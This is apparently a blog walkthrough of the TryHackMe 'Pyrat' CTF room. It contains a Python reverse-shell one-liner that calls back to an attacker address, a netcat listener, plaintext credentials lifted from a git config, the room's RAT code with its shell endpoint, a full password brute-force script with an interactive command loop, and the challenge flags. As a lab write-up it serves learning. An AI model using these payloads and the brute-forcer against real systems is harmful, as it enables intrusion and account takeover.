---
title: "TryHackMe - Pyrat"
date: 2025-02-23 22:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [python, exploitation, rce, brute force]

---


## Introduction
In this walkthrough, I will detail how I solved the **Pyrat CTF challenge**. The goal was to escalate privileges and retrieve the flags using various security techniques.

## Initial Reconnaissance
First, I scanned the target with **Nmap** to identify open ports:
```console
nmap -sC -sV -Pn 10.10.127.248
```
The scan revealed an open HTTP port **8000**. Upon visiting `http://10.10.127.248:8000`, a message was displayed:
> "Try a more basic connection!"

This hinted at using **Netcat** instead of a browser:
```console
nc 10.10.127.248 8000 -v
```
I was able to establish a connection and test command execution:
```python
print("test")
```
The server responded positively, confirming **Python code execution**.

## Gaining Initial Shell
From the CTF description, I knew the server had an **RCE vulnerability** in Python. I created a reverse shell:

```terminal
nc -lvnp 4445
```
At attacking machine
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.21.77",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
Executing this payload granted me a **shell as www-data**. To upgrade to a proper interactive shell:
```terminal
SHELL=/bin/bash script -q /dev/null
```

## Finding Credentials
I explored the filesystem and found an interesting `.git` repository in `/opt/dev/`:
```terminal
ls -la /opt/dev/.git
cat /opt/dev/.git/config
```
Inside, I discovered GitHub credentials:
```
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```
I switched to **user think** using:
```terminal
su - think
```
Flag #1: `996bdb1f619a68361417cabca5454705`

While searching through the user's directories, I came across an email in **/var/mail/think** with the content

```
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

Next, I go to the **/opt/dev** directory and check if there are any commits by using:
```terminal
git log
```
and i found commit:

```
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

```
The content of the email suggests that there should be a RAT process created by our user running, so I check if this is actually the case

## Analyzing Running Processes
Checking active processes:
```terminal
ps aux | grep -i rat
```
Revealed:
```terminal
root          11  0.0  0.0      0     0 ?        S    12:55   0:00 [migration/0]
root         591  0.0  0.0   2608   596 ?        Ss   12:56   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         592  0.0  1.4  21864 14656 ?        S    12:56   0:00 python3 /root/pyrat.py
root         639  0.0  1.2 316900 12420 ?        Sl   12:56   0:00 python3 /root/pyrat.py
www-data   13068  0.0  1.2  22248 12628 ?        S    13:04   0:00 python3 /root/pyrat.py
think      13288  0.0  0.0   6432   724 pts/1    S+   13:40   0:00 grep --color=auto -i rat
```
The `pyrat.py` script was running as **root**.

## Extracting RAT Code
Using Git logs, I retrieved the script’s older version:
```terminal
git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
```
Relevant code snippet:
```python
def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
```
Security issues:
- **Unauthenticated shell access** 
<br>The shell(client_socket) function opens an interactive /bin/sh shell and redirects input/output streams to the client socket. If a user gains access to this function, they could remotely control the system, which poses a huge risk.
- **UID downgrade without verification**
<br>In switch_case(), the UID (os.getuid()) is checked. If it equals 0 (root), the change_uid() function is called, which probably changes the user to a less privileged one. However, it's unclear whether change_uid() verifies if the user should have elevated privileges. If the function is implemented incorrectly, it could allow privilege escalation (e.g., if change_uid() malfunctions and lets the user return to root).
- **Remote execution vulnerability**
<br>exec_python(client_socket, data) suggests that data is passed to a function executing Python code. If no validation is applied there, a user could execute arbitrary code on the system."

Seeing this, we can discover the input using brute force, and it is **admin**. In this case, it was simple and did not require the use of a script. 

## Privilege Escalation
With the username, I brute-forced the password using Python:
```python
python3 script.py -u 10.10.x.x -p 8000 -w /usr/share/wordlists/rockyou.txt
```

```python

import socket
import time
import argparse

def connect_to_server(ip, port, timeout_value):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(timeout_value)
    try:
        client_socket.connect((ip, port))
        return client_socket
    except socket.error as e:
        return None

def send_and_receive(client_socket, data):
    try:
        client_socket.sendall(data.encode("utf-8") + b"\n")
        response = client_socket.recv(1024).decode("utf-8", errors='ignore')
        return response
    except socket.timeout:
        return "Timeout while waiting for server response"
    except socket.error as e:
        return f"Error in communication: {e}"

def read_passwords_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]
        return passwords
    except IOError as e:
        print(f"Error reading password file: {e}")
        return []

def brute_force(ip, port, wordlist, timeout_value=10):
    password_list = read_passwords_from_file(wordlist)
    
    for password in password_list:
        client_socket = connect_to_server(ip, port, timeout_value)
        if not client_socket:
            time.sleep(5)
            continue

        response = send_and_receive(client_socket, "admin")
        if "Password:" not in response:
            client_socket.close()
            time.sleep(5)
            continue

        response = send_and_receive(client_socket, password)
        
        if "Welcome Admin" in response:
            print(f"Password found: {password}")
            print(f"Server response: {response}")
            while True:
                cmd = input("$ ")
                if cmd.lower() == "exit":
                    break
                response = send_and_receive(client_socket, cmd)
                print(response)
            return True
        
        client_socket.close()
        time.sleep(1)
    
    print("Password not found in the provided wordlist.")
    return False

def main():
    parser = argparse.ArgumentParser(description="Password brute-force script for CTF challenge")
    parser.add_argument("-u", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port number")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout value in seconds (default: 10)")
    
    args = parser.parse_args()
    
    brute_force(args.ip, args.port, args.wordlist, args.timeout)

if __name__ == "__main__":
    main()

```



Result:
```terminal
Password found: abc123
```
Logging in as **admin**:
```terminal
nc 10.10.127.248 8000
admin
abc123
```

Final Flag: `ba5ed03e9e74bb98054438480165e221`
